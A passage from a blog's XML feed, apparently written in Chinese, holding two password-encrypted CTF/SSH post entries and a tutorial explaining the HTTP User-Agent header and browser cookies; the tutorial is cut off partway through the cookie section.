4c7e2cad770e1d5d95ea9dc53a2491478849a249c410c0f3a02632fecaab5440ff22534787d8187b1361afd0947807f742bd7d727d93c42f519e947a0cfb0f7f1a8a3bff2a4a5fc5c76b30e6195ac4f575103b8e8f85b85d1638d83bb42a32fc94b83fcaf6ea42a95aa41f25ed3be3c8eddc8c963e7c4c1d3c1d816227f1dae0b7958702bf3b1483f3f9534991900e44dfe9197c78d40b137d7492490f7279f355884da5d83f798c85e1537c248ff13ca3082fe3bac66826bb03cc1bf5b2d6c13c85877e4cf652dd381e1ca74ba389ef6d456fd7eee29aa20b7be4b40a5a355690d19566a5fa4883d53d5531addd1aa474c6f9be3c57b8d9fecd6c4d3f9c3c84df3e4306f85bae717d35f9c4a3bfe551dab855632428ce19efaaf5c83610684e92bc7e9dab00c222d7dfe0719042f2ba82d4f2133c9228f587f2791fddea58d919676093c0d335ba469546a8217af3f50f6e97535c3d9b088f5b4c7c8d6ff6a48927c503059627b466e43d745294b9f5e23d5631421994f619cb354cab513ecd2abdb7ac48286b218de19c6cc0a8f82ddd07294b848631564bb0b606f5109ffa44a0ca1410384c2dfa98177f229828c815bbff34c07396f28513b4d9fbf95ea45d2e471cf6ec9d1b07729a31ea81c29445f85a733fa34fadf078c3b9d563bf7371afb720e46d3893b00ef225a7b722c6a2e18e4dab35431581c4f887a868b8261dbe878e26d43ede9e7b7c5d9db2aa736d8d58e13d6ae7af91bbc37c953efccd5882092be6748700c77c12fa87ceb927cfd6954006ffc0c77af181b995ae3e85efce522fb9e45ee425c75c8c3028b077e9c9424017c212f813fba1d7d76f63684b6c5f0df04d2c4e1a60ae327469d364ea54ba26a0d6b1242c47f89acc566dc1fa4a5fe05acf0e7815225005f12479376de4c3e89149017e7a1daaba905c9efef902daf49f0af33c3a062c381fac3541fcfd1874515587a33f1a168c038fa2f6fa2e83085fefdb7c6c478a68df3068081f23df69ab79a308332ef7261b6ac8d7234cb3133b98cb0431996804cab1a8493657a47af0ffcd52dcd9dab2a589d9a9310ec7423b69f8d113703dabbb7c83b84c5bbbfebc09b1fb43c0afeff4c1f9a631141acfcec23076ab1a96dfa069830600241495ae114d89187df1a1bb55cb97202f4d9dab8510c44adb09150c71e16c4a6344932234ba874a65d990611e20a13bfd8b818e88d9d4dabb0159f01002b9e76171e8d51d21ffe274ff31a1ee96f3e291c71264970b0ddf46da63757102d076be41a8c2a4654c273ff86264abe6cfc8ef8997225a81f6ccf684beb702ee5c7fceba7d470b4766cc8d6bc57c9c37662a8323553c980b609e4f3c6b9fd474ff5e25c86131c6d40f34377cad4a773df548fd6915a0245bbd0f3a68b084fb06b6628dd22433410fef959c17207e990bbeedeb7d60b86548ff140f787b77ba4fb2f5c88b9fbbe50605f2523eb6a785e61a36394274f95c614a583f7eb90c66074880ca4e706581bb38cb136ca8295bd4eb7ff235b2c514eb08f914e61b51db0e3472f7ddb520edd97517dfefd67309f288642203e3f282b77855e151c8a877c2fa61aa5f8bcdb52261c5b28fa524ddf3a3118990f022647b391374c4fa0d73852419a6ae58f7f197e8f893359f2edc1df0921bb4118b11faa99239569841f8f19e76e322cf659d3145dbe826c6ea01cfb36bcc7153ae30db549cded2c5ea0d67022f7a070c501a3b7a012dfb11392c7e467341663f794850cbee73cdf92824ef355fa14d91106467cc9cec1e32d5b67e3f53d331fa2c38d037f6aab7bc6da2c4d12b221fdf709dc54e6d9e35909c1e55d4bbe81478be50425e24aa49d56124cee9d53446995ea1a97af9ba01b866145dfd14462491efd02e9619b2d26f01e08c6daab4a1c6dff56cefd4364272b35165775ba5f4ff054d886f3f2529d31315b3f22b77bde85305aee23de8f48b259af05d4baef5ab4564608716fbe76081f8ba06281f689c392cccc13361120183622a3eb50096f64050162f6f4fcb8d1ef2461ca043b60bffab1120002c510e01843a30bae3ff584ea809ab86545f631e2b9716d956f54ab09e6c69f8e8719d56143b038abc1da0478d445a5b6aaad6b0d50695c1da7069998704f835689b725f28b7b1921235a9257dd87632ca48be3bed57bbbc23eb9b0142ecc5f2fdb1bf18d306157c3a5d20f655ce92ec26f0e7250f38136b5954affb397226635e93c09952d0ba525974d2fd5244d94f50554ae11988e8542b48055ffb6adf3a7d08e6bc302f607d9650571e14234664ce9f24fe83743f21c2f9244785e691404140916fef755c41a6ce132776728dc1e7df5ba7c4e9432f1ae3d6ddc302c0e15a2467dd106ad17fea09654c9c443399a20583502dff97a3d730abe06fc386524993d0dd00e51a5cb4a94852cd31bb65e78dc52a1c8fef8749517d5313057b0ef81e0d5eb3d5bf924af2d00490f5a73937f976291784b0791fc75e1006fa132bc3d6531942c60c8ff47dd169164d5daa1501910cef0aae16621baf0257504cac02de7f9cbe54be21193b5e701ba73f450414cfbcc5da32876cb3e5ac6f5e4ccaade9b29fad2ead6c4d97f64504e4c7ad0a9baac9f8ed830937bfb69e15e2d6f7d56b6c289b0dbd235460dbd450e94474cf5e0ca78307783f845a0be34200b538bbc50613705d01544695e7b663e636eeb86276076564d99e05f8f69839f517bc1a32880d7461ef068f6ad6f06ac32c08724afebcf7e4e8ff98ca921b7f367298c6b0f39468b4df941c8377d064720c6b2a9f8ff9f250e9875ed956a6a7b0c1164fb12ba741039ad2f341847c5d38b74c10bcab2ef9b87e86d486b7f041aa46349be9f1bf4fa35f8d259c95b4937e54c36b76e1902bf5aa3dde44e2795956b24ad0989208d30bfac887a22f89643d4299daa9c482f491ad0b1d48157e36916c7af0bf1d2f4922c2be97bbd6347d59756132c4beeb981494074925d96ede87277f0b57d34a87b40df0c9e2aeefc02bc8e2ffc607920e78a64ff74008c6156dec94c3b2565bb4b84c4fcf30a1a11a6148de443d373062e93a598b830b9b0e3b0b1caeb8058e3660db056c4d313f2a9e23c2811212acc84430b47be74a30282f953733ea33169ab49a6e7bfc27d593470d53c91b48759c3d423ade5600b9f89f5edb4c2ce526a361426ac4fb536c80e3d643e7970d826ece48a6b85b94328574a7f30eb850a182d8a93cfe830b67ac7f07ccd7693ef8471041fb1a97ffb08109efd3850094cf212f1394e48ffad14590e9dfb5c8c8c200b11b8122bd73ce2e0c7b093ed2f2d5498a8780c8e1904efa0b8e9f9dd4b838850f4030c9e1be245557cfec47be1918e394b3ec3c92e2a2a49761b05ba3fa450ac7ad076115ecf3792080aad2a8c6996431255baf17e5b772def6b14bf49a183d71c48e895a9d47709396a8eeba05619899c70261be0aed612030c8fa330453c8a4f5e3fce6331b69829adc8b1f06a1412731008e2c5fce37ded2264e673df9781e189d517904a91272e2042a8b7770d477f8913d03b1b594854b67c2392b27747ca807c4bf11996ef437291e83d4088c0954b155096f4db090a867567c19dc71f72e574a1d5544ac1957eaddab46ac19ef981be39c800de7ce1f1c5d0adcf2ba11c8d683ac5c4e781336d01de3eac96d53183e29c4da6fdc1c0734ae724ce5357ccbcf6dc9519e5ac1b43e5a97f80bfb13c0be99da00a86fce6df8e2d5726d795fe22c8d71a1a50b324e2027b4ac2ccb53e5ed5fc3610eb441d22dbc4205a87c3c465d513b134f7a0c2828528ad86359820ce980617bb7b9a26d40251867ce62123997f1d9747bb6d97c50a093ef5894a5eafac8059e94f74506deddece258ed0ac394f98ca2dc3d97cf519dc9bfd539e1916a175f1de2ae5dc09cdd334dd8f971e3eb39240ddc76b4806e1d2ea0bb447fe464a0ea1bb34a6b07d10e122439c7b42a10cc1faa32cc7a1989b345ce65b1611af91cd9de5816aebf92f757ad382692d8b4c9e9936c0999321cc67105e89d5b1b0b3d6542d99a8435c9f26568a71b94642fa28f9f707e200c24024ddc6fdee6d072d1124b232880276c98bea6922046f8cd748a11e2ce1a97d17ae3c6b2d713f1991a4b0e77c75d7422e38e28f6613ae1329582d74c2d1c4d523c489815bb6f068e360e424584911544a5a5094efaabfa0460cb2e6b3aa57d518b87b36c7c79e10060f86703f107b6e73d6aa95a32ad585aa32260bff7ebf23de7f2d1fb678ae09b98a15d06844819343a5b75cb2ba84dc6c434383215d60d0713447ca0bcdc56ff8bae578c3ae8d3a0c98874ee9e6363b908a1e45717d3e830fb5d6fd30e48f2b39884d3f72d779e2e971434c76db467bd35d3d9c8635546729a1521a85166994da5af1606e229262befb44c86952c1df0e4413d1bcfb2fcb5b41bcb8a7b195cca9b702dcaa7496b9d0d44b5bcc5d2d68a68a2eb4e9224d195dc8acb9c7e189891651fdfae80857cd537792669afbb3c9c20dbb1545b10cb1c91520c5784635d95ceb0eb3127f63531bd07d418f511ce3c853ded0a2b3818d098055b4d7c433efa25187baff4ff7dc2fc76e6061256c797447e66b77d6b70cb0bb11d5e4f9fe93dcabd8933dcf69c6abaab1c85521542e4b45ecbbea04beeab3ff79cee6e2f7ce2f63ce4538d29569ea1444732ddd3959e54aea2cf3ce338b47a51a2629e71b12c4f366d5efc7b1110d2ca0ebb16e17ad6b076223fc8f3892679008c280c968ecfcea8bba43b57e6ab2747d032fad15132e7b1575d4a8ac52e0e41f7a2614d8461b9654259b3380482cd78c7bb924ebd0ee753c9fc8a5ae01983dfbb2cdabcc551040dbea086396c41905f6d1852321edfff93d3c4ae2da11978c9236d8cb74597babc749004b1c81cb260c25fe9edd35ccd336eec101268fc22a2eac57e26f20b315d721d353574e77732102db9ee281c547659fa83fd8c197995095cd2c2fcd36a6b46d166cf6656a4093cf9368276424d7978a5855523b1023339999e30e4fdb725bff88b43702f860c666b992b2a27775de76d7d328373b69576d10fcab2994fa3376039749e6931b84bbfdc0baf43db4228e025d04b8b8249da669ed09893a17c1c48d8db2b3183e2b796eecb52fde9a66803f0c4846e6c7cf69ea2f99cee54c76a3d9884e6a95b68d5c687356653c78860bf4f9c1e49f9b89fde6cffe3761652aa63f957cebcc1c8c9a6b5b8936d76c8d95d602281936044648fc5edf885b1b172009ba66ac8524ab3c726c3db2f38c9cad2a3b641d8a9d2ebbba504143c13567ba3356e6cfffd029577bb461e4a3b4dc02d095b4f1a16e86adbf939f21f5f57f68974cdcfdf093cec86df3808273717f9ab8e3ccef9ae4a8db1b6952fb546f86c77e020da29eaf62ec4cc8b38ff22b6e9d51eba80d85ce402deb09b2f2c0cbc6c276c8c62d138a00e1e1b15d5233bd733ada4172780cc6c35a5e9503bb71d48021d06398be34c20b4629337b0af78dbde807fdf1371615c572a084d76d3a60b46782a394465f39f2d6607059ccbe318ec0f269bcc64226a242e74f4bd3c1df7c5834eb98b8b3583a406a8e2fe0200cd63885854df0918253dfb678cab7a74bca940d099bb71cbc6a316a03cfd311fdc5265241e041c87508ca6a8d6d175870beed08243fe8331b3b9bb647ceafc711bf6e2b1e3950af2bced1f622d4789cb9828594c71387a2ad4bd410b0fc5479799c8e4a391c8c25863445ecdc926307610e800fea4de7382d8ac1a93fbbc49b28999630c5c090680519c28a930139074b753d2b8fdb2c1f564c5d8fd2bb7d92c3748265bdc17b950bc280e67c67d8347ff0befc12fa0942bbb8e5d06924ccbc57c423cb41418099d4e7e27629c18bbfa4450817bab94dee8ec1841246c91ceacc7605981afa779eeb10f12bf5e682e171cf4d0c28cacb700bb6240da3a12479857d417e27a1a1ba974a87f8c7bf577a2d8150d3304e825b64871b34a05e4c573abbc06096258812cea4b0a869fe77f91f639cb432bfe3f29469f60a87dd5e045f06d9d7b0f5d5813f99d07f56d2740b4264f4f1fada088f3c8aeb2d6f1f5df2ba2ba374dd484db638e99ee23346483e46a04693df98496fed2fd7d1d6a491b074e126a6b85d195b5f9b23f77ae110dcc823f7bc455ed2c17b29b6601c9b8dedafbb4dbbea4ec64f15352daec6a864b598716e04af7af7204e022b106af908cced4f913ae128ed1e9cbb9a71f5d090ee3290103c2b978955059e05e073fce1d7323597c17f65c495efd5f3476809a002d3fd4361792027dc479e40aabe9a402f8cdb6d6d298147a95c2220b2b78edb8715fc2607000160a92fa2ddee52467242d591a7d6e46c5ccf8ad74d45b1e69c8a5d2af571e93f54e2776b825179e3fdc84d07e83600a1f69170dc3bcfac11d6354d369a4472e0a29a34a1af46eaa184e6f19ca02d003c488efacd5d038c50e39083b424f932d0808cebb7b8892167b66131586b45398bac95253eae36542eae80df06689759034f389451015559ec3c37ac93841fdbb629bfd253160b3a7357094b4a3640c819dfb9c111e38866c078e51eea0daf080de9407e6ec68ee1eb0fecf3896f777879683a520924697094117ca5f4b53a1ab65456ae0f4b15c3e58eabfb33134ed12b9044779317e0fbe85168e61da08447858a01aa8abe82e993575aef732e3c9e4b32797a2154a88c817365d2efb649f9628793abdaecfbc8ce9a5af8b9d5f2142429824ad7ba4d61138e43d18ada2ee191c1ae028a2f8fe2cf12760915b1b96c4e7c703be0de62947aa5eb427997a266afec1d30e995423cb718c8f60d99791ea252fe2e0e87e6c970e6f4b45b5e9d4aa3873cf9d347c1fd8728485de1e757ce4836ace48ea45a10104e6f113867352af20882889fa958fc0d527d4c72fe85045050a977d48379a947f8c871b810163a89cb41c2ad870cbfb7fcb05473e772ad50f747a1286c357076c6dda7490f6eab3d0be8c8ae4db66b0ab40a7e9cd8037fe908fa8d29b3ebc2af379448cfb762be09ffd57af0cd74c46aaf607bcdd29e18fdad1044386b2868868d30d0ca5895b3423cae20ec29ff02e7fa54c1b67e428fc4efd28c1022d93019aba461aaafb82320c806ebd2bd88dd2c4ca0798e92f60ea655729aa871c31fbf81134016911f182447fa60035c333e9f96bb4422cbb7539157615a03a4db01fc8b5c99bd20450506d64fdc7dd8bf0012ab7660d28554890e87160978eda81d21e094cc68813e2af187cb25c44e3cbd62d6b72b7cb3b711cb525b174a75ef2aa09f2097496966c1dfac28b8e29534fa60290ff61f77ea97f44586afd5798b14fcc9927aff2fbb53b475b16d93d2c839908a10fb9fa0857fd7e0187f45bf3a6ce8b3042c70d3d69a9f59e779428e962dcc0d0ee1b67fb510b4d02d6910fd9f03c25f3cfdc01255b9547fe9dfcd491699a75f49b5f72df2d24459a057e8769d331d11a1c8a249eb08ca059aba0414b18c21b6812dad234c419530a6aea3602de8947167f6662d431ab698b443e1b8214e6642dead711227e329637f73dc7788fb894b12ff285d86fd014c1f153ebf6f9a86b7ee95932e980154147671d0db6639acb8cca3e2869794df5097100c999d1c4594e4ccb3834678874d37a7e036af07edc9b1e4960ee941a701ab259291f28750da14784beb5606f8910a2d8284d3d7762a9746cd68080dbb56aa570c0bde8092f10dc35a3f350692aee5ecad72e4636513b83f768d4ee48d2b869f4ca45a48f73fb9f4fcf00dd58b6fb6c1682f96957231ce51fc73662b758a2fd92713ee085e569682955e6bc6d3d7f0c446467949868c172c31aa19dd968cbc067c238311b2772b0a91058ac84c446f60495bf844a41e5ddffd13770781693e3388c18e409fcb127386177c822ac02426e7e223fd90b00b6b8181dd39af6b612e8468b48eb31b174a133d27abe0b4364164054288fb74afffab3330a263aae368d6d45211211d1efe8927ccb34d199cd7cce40995cb2b28e57a9f6c3ce76a81744f72ef63f33df44098734356d34ed894929664e3fb37c13a64472f7eb3d60469af65608fe95cddefdf5d6738d90357e3a0a53cd50b9f462bef8c1d375db09469f0b8afebacd266df41c10ccbba4b9c0545bfe3ab957126d472ec9b714c7b4f802b9fe1130c05cbb7525f115538cc781cc931fb1a6617d955ec06e841ad6bff59ae4293e87927fc7f2e480060013de8db0b8f5ac4e492d1588f9d0776efbcb7662819db990ed8e3956d2cf54b1c5049d96f381b6018f85f197c6c1bb2a7262a744c24c3fcdca24f3990b42fa478c51145501c87a92bc7b051854a586b7bd90ae08c7b7afd39db432cdd5b38fd2defe22d48df94a79dd48b6061d6396c344ee1a2915350186590433f00ec8eac9d7ba73142a6a7e7f8cb009d75e33f2756ac7514c671a7ad96ebd8c31c1ce9a2a0017d24c915d1ad8d7cfcf3edf019440f3f6ac4f7a2466596251814d1b12ea6d6acf29b6c8d53fec5ab2e60889cf24020a06e0bfb0702eb44b9e539d3000053bfc534a3aeeffd699b695e76c9f8951cedd42548f4268744e69137b9144579bb221c30a084cfb20f5b4d3d2a1b6bddbaa7de0defedf9a01827bb25301283f24e3bda6d2c955d8d4929585b97363cb8c5230c812a66f42c99fa0e337e25cf59f9b96190c220a3ae30d78b12538bbc9bac24c5040f6a128bfafc8b3c0873e6b428a43b9dddb482267e144fc5b92cff2faa4389a67e7b86f7ad8b83738b95c38a1a3e8b19881f1f755d7bcb131a714e4c4abce87c660325da52e989a56e86d8ed4310bbfde25c929cd4f53aa795f7dfb26746888b477ed4a1bfa947e326f3e2f0bfb49f7dca5a97d8f0bb85a947d3ad9d37cf9681a9ec672e15af4d3322a7a42b80522d01017e7e403e47bd296878390613dd43717ae2472d571af62f434db9bc3456fd239bedba51360f1035b54eaa45022086dc5d181be43631ece2c44af09eca1a8157259670cea23e4980a18638380b955a942e28cb5dabc45f6e7ca44516b05f4cf1c20ca2b48a118f52635ef26518032d31257e10239386dc0a541f8dbb400dd50c8323b2c3d553312ee96785a9c50ff03d0ef73409c78a37a18ce485ccb0a9fc68b544a6c1136a93fc0da1fb2fd65407d397388784e7c77bbeb27257be299c8891a2a706cd3d2b72758492c4f17ebfcdf23d853fbee238f873d5e6a06d2c0c333069ef80c6fb0026a9c89978a96ce6716b21f4a81bbdca8edc6791f37688a59b9224cee072aa7899132415d16f10d0b5d733d29da21921164a215260a61128a7430df53af769145cde0b4cb419d77ed117152e7c2a6dce7cb74fcb9c0f30450431f7eab375a32cc745ef1eaf5f274f7a7211ca8bae0bf5aa87d7635dff314978135176391aa4075f3829643e089a280b4c76ec02e0692b1bfdbeee6b0b7a6b98cee7abdfe7e5e09a188f3d8b66bcc5ea580ea8eed6786e2ce4ae366d4964fd25704f204b655c6809281d38d8efd4d3c42516fdaaf1a82f50a71e44ae9c267d717fd475193c4677d9bd0ec5c053bd9193c3adfe42df3d0e5f07ee467c086a420fb026f18448c6e5180fa4ff64646345149ebdec6f968f69e06d7247e8b35fd63b3a66a18e76e6867350d2acf842c4740246aeb2661a4643d523ce6bf5ccc153eac093cec9e2c5141b5af88f9b298c7b021f4aa248523136a98233da048a366fa6fa044a7ba145a289b54327b86e2c99a8b865d460f9bb7b09d23ecc31f37e5ad9815b9f534d56601b8d75a26571fdb113d1416e9af385e95464f83c8d197c7f0813794a810554bf0a4dc847a6b38a77505fe0bbeeaccf56ad6c4ec1c927a4102adba21e207194be838210cfa64adce1b57fce8ef82eafe44d296d6fe7d32eafb2d03872c17eab1367c4798962b3fa59ca7943a48115093d598e7bff833f90cb5f6969fd9896880939101f96c17ecfb9ee7054bb2e8d4e1fdd9ff0b18f8a995b4c761e23f0ac0be06cc6ff4589da6d0f4ae84a48b1005e07e424b0619ebbf8771bf15402cc9e7d9a35a49cb4475d5e6f8f9c0b87a9e6795f4fb7a203763aab52b6d2f5604d995f9f94b0039746ba153c921819c18de784c5ecceae7e8b32d0d8e4d179526f26ca74ac1acac3db15730e45418b53b71c042b0160b883a49ab1351683aa29b74039585309f4eb93a5c6e369c70a82daaa192dea3e875234c4454c8e4cba73e5c34d28d408b8f870e8ec40c25e3d3b7de57b4315410367282ffe3608f640dd00e7614f1147a74de62f0fe7431dd2a7775a85f5b6406067b4ba7a5369d74b386d37d008cd2a050e4f20f7c326f63f9a1e1505bf16bcd21bd7263b43307b2ded4c685072d36504461828df9ff7fb3957d8cd084929feceb7bf38ee7ac8199c063808daf4e3c0030329e07731893a5a09093a5dee23523e42eac16181cf97c35fcfc0ea360566283672dcd32a187dad33e2419683421704409da8868ec5eea2ed4c2dec25950d7cf228844733d076d0c2411fbe3293d2a874d62ea7b437cac744d881bff1a42ae340a12cb858b695ce6a5db58ffa39455612cc2f5959996cdb7e66cef78da979c3dbd6e21509a8419b6442d8953235035be7189139ca511dd616e2fecccf2b837f979268df8af493e251b2c1f37b9413b005928eba97fbe09c500300ebfa6cd778b2a45d885d012a2c02f30c1c609efc44bc74de506314cffb773fb1b5cf81034ce9bb8645ad48b303b67d57f84e223a4856a088c5d3ce5f342a3588307c05306f63cf316dbb89d3f85ba12960f6f301c7dcf8023065b6610ce81c6cce3fce8180945f9a7f69ea7454c35b97d3ead69fee388288c9ff970044be610efcc48830e9af652ca68016eb09a5e871e8c992993e63eb379a2a791fd8f92547564c1ba6b5a955cfd667d4d7dbc8fc5d057075abf89e61b48e54d21a425fe6669a23f12ea6bd9d1456743487f6bee9b340d8d8f9a7b08c41d2b077500562919996d2335c08b251cbec68b31413a4c4c072810756847a9abc60af7a18302ce6ac36c921be01506492d9d21c2d6aa3a9aa9e01a05a261cd2ac9dfc54f753ac9dbc8b96847c4c019cc604f38f6715afba49c80835c92c84e3760ab8e910e7e817e21e82ff3c0ce5f98f661da45921dec9ad87db433f7cfa3a1d180d1b03eb25d7070fafa541b645a104db9e4ac3ddaf29768c86b5f0497d4385d955d39e315672ad23e51f3ec84661802516af785ef9e15f945381103f60b3b2077c20faa24deab5ca9c06af271e020be26c931967a6afa1cc1fdfa0deaa8b02804c125cfc873b38ac21445e8633781b42d9e4e9bb87fd7f55994251381a59166758423e1ce502a9543a5857d9b798e91f2b3a33d4b9531a6e95f4b453d65bc7593e7fc296f2d442348eedd2ab94480a01bb10afd19ce77297e58d311fc9ce40b28883af37f883c681a5b0a3e56673e371a69b4b02507a424fdcc0c3f75d151ed408b46e9c955c05f1cb546fe804400e88f54f0cc84db4a63019cb7a81643ef4e62112290dee08563a674a3467f90e2800ce224c58f98fe2f418ee42c48a787d05df376a11fa539b9951c2aae1f731e7e460ba234764b6826ccf14d3c99d344a440</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SSH服务渗透测试</title>
    <url>/post/CTF-SSH-service-penetration/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="4125e351aa327955976eec9c58b14fb68c02e2c806ab403274d083c16e68b9ef"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>《HTTP协议请求头部的User-Agen和Cookie》</title>
    <url>/post/HTTP-User-Agen-Cookie/</url>
    <content><![CDATA[<p>&ensp;</p>
<h4 id="一、User-Agen"><a href="#一、User-Agen" class="headerlink" title="一、User-Agen"></a><font color="red" >一、User-Agen</font></h4><p><strong>注意在HTTP头部参数的首字母大写格式！</strong></p>
<h5 id="🌸1-1-什么是User-Agen"><a href="#🌸1-1-什么是User-Agen" class="headerlink" title="🌸1.1 什么是User-Agen"></a>🌸<font color="red" face="楷体">1.1 什么是User-Agen</font></h5><table><tr><td bgcolor=#EDEDED><font face="楷体"><font color="#008B45">**1.1.1**、</font> Http Header之User-Agen的User-Agen中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。UA可以进行伪装。<font color="red">浏览器的UA字串的标准格式：浏览器标识 (操作系统标识; 加密等级标识; 浏览器语言)渲染引擎标识版本信息</font>。但各个浏览器有所不同。</font></td></tr></table><table><tr><td bgcolor=#EDEDED><font face="楷体"><font color="#008B45">**1.1.2**、</font>用较为普通的一点来说，是一种向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。UA字符串在每次浏览器 HTTP 请求时发送到服务器！User-Agen也是用户识别的重要部分，通过分析，能知道用户使用的是什么设备、什么浏览器、什么应用等，进而可以分析其购买力、属性、职业等。</font></td></tr></table>


<p>&ensp;</p>
<h5 id="🌸1-2-对UA字串的说明"><a href="#🌸1-2-对UA字串的说明" class="headerlink" title="🌸1.2 对UA字串的说明"></a><font color="red" face="楷体">🌸1.2 对UA字串的说明</font></h5><p><font face="楷体"><font color="#008B45"><strong>1.2.1</strong> </font><br><font face="仿体">&emsp;出于兼容及推广等目的，很多浏览器的标识相同，因此浏览器标识并不能说明浏览器的真实版本，真实版本信息在 UA 字串尾部可以找到。</font></font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.2</strong> <strong>操作系统标识</strong></font><br><img data-src="https://s1.ax1x.com/2018/12/18/FBlnde.jpg" alt="FBlnde.jpg"></font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.3</strong> <strong>加密等级标识</strong></font><br>&emsp;N: 表示无安全加密<br>&emsp;I: 表示弱安全加密<br>&emsp;U: 表示强安全加密</font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.4</strong> <strong>浏览器语言</strong></font><br>&emsp;在首选项 &gt; 常规 &gt; 语言中指定的语言</font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.5</strong> <strong>渲染引擎</strong></font><br>&emsp;显示浏览器使用的主流渲染引擎有：Gecko、WebKit、KHTML、Presto、Trident、Tasman等，格式为：渲染引擎/版本信息</font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.6</strong> <strong>版本信息</strong></font><br>&emsp;显示浏览器的真实版本信息，格式为：浏览器/版本信息<br>注：<br>1、在广告定向设定中，浏览器定向和操作系统定向均是针对User-Agent中的信息进行定向。<br>2、欲了解更多的User-Agent信息，请参考User-Agen 字串史</font></p>
<hr>
<hr>
<p>&ensp;</p>
<h5 id="🌸1-3-User-Agen的作用"><a href="#🌸1-3-User-Agen的作用" class="headerlink" title="🌸1.3 User-Agen的作用"></a><font color="red" >🌸1.3 User-Agen的作用</font></h5><table><tr><td bgcolor=#EDEDED><font face="楷体">通过user-agent不能完全准确的判断是属于那款浏览器。由于UA字符串在每次浏览器HTTP 请求时发送到服务器，所以服务器就可以根据它来做好多事。
比如：
1、统计用户浏览器使用情况。有些浏览器说被多少人使用了，实际上就可以通过判断每个IP的UA来确定这个IP是用什么浏览器访问的，以得到使用量的数据。
2、根据用户使用浏览器的不同，显示不同的排版从而为用户提供更好的体验。有些网站会根据这个来调整打开网站的类型,如是手机的就打开wap，显示非手机的就打开pc常规页面。用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。 
既然知道了UA的作用，那么其实客户端也可以使用UA来做一些神奇的事。
比如：伪装 User-Agen 来回避某些侦测特定浏览器才能读取的网站。
如果使用Firefox浏览器插件User-Agen switcher，用户就可以轻松地在不同UA之间切换，把自己伪装成其他浏览器。这样就可以在PC上预览WAP或移动格式的网页，比如专门为iPhone设计的页面。</font></td></tr></table>

<p>&ensp;</p>
<h4 id="二、Cookie——用户追踪之基础技术"><a href="#二、Cookie——用户追踪之基础技术" class="headerlink" title="二、Cookie——用户追踪之基础技术"></a><font color="red" >二、Cookie——用户追踪之基础技术</font></h4><h5 id="2-1-关于Cookie"><a href="#2-1-关于Cookie" class="headerlink" title="2.1 关于Cookie"></a><font color="red" face="楷体">2.1 关于Cookie</font></h5><h6 id="2-1-1-前言"><a href="#2-1-1-前言" class="headerlink" title="2.1.1 前言 "></a><font color="#008B45" face="楷体"><strong>2.1.1 前言</strong> </font></h6><p><font face="仿体">&emsp;Cookie是如此的重要，以至于我们后面要讲到的回头客定向、访客频次定向、用户定向等等都需要基于此技术才可以实现，并且我们日常工作中所能见到的第三方监测工具如doubleclick、99click、秒针等也都要利用cookie技术，网站分析工具如GA、百度统计、CNZZ等也需要利用Cookie。如果没有Cookie，互联网广告市场将受到巨大打击，尤其对于目前我们谈论的精准广告而言。如果没有Cookie，网站分析也不从做起，遑论优化了。<br></font></p>
<hr>
<hr>
<h6 id="2-1-2-Cookie是什么"><a href="#2-1-2-Cookie是什么" class="headerlink" title="2.1.2 Cookie是什么 "></a><font color="#008B45" face="楷体"><strong>2.1.2 Cookie是什么</strong> </font></h6><p><font face="仿体">&emsp;Cookie在英文中是小甜品的意思，但在计算机语言中，Cookie指的是当你浏览某网站时，网站存储在你电脑上的一个小文本文件，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。它记录了你的用户ID，密码、浏览过的网页、停留的时间等信息，用于用户身份的辨别。Cookie通常是以user@domain格式命名的，user是你的本地用户名，domain是所访问的网站的域名。</font></p>
<hr>
<hr>
<h6 id="2-1-3-为什么要Cookie"><a href="#2-1-3-为什么要Cookie" class="headerlink" title="2.1.3 为什么要Cookie "></a><font color="#008B45" face="楷体"><strong>2.1.3 为什么要Cookie</strong> </font></h6><p><font face="仿体">&emsp;因为HTTP协议是无状态的，对于一个浏览器发出的请求，服务器无法区分是不是同一个来源，无法知道上一次用户做了什么。所以，需要额外的数据用于维护会话。 Cookie 正是这样的一段随HTTP请求一起被传递的额外数据，用于维护浏览器和服务器的会话。我们可以想象一个场景，你没有登录京东时在京东上购物，选择了3件商品放入购物车，在结算时，京东为什么还能知道这三件商品是什么？没错，是Cookie！</font></p>
<hr>
<hr>
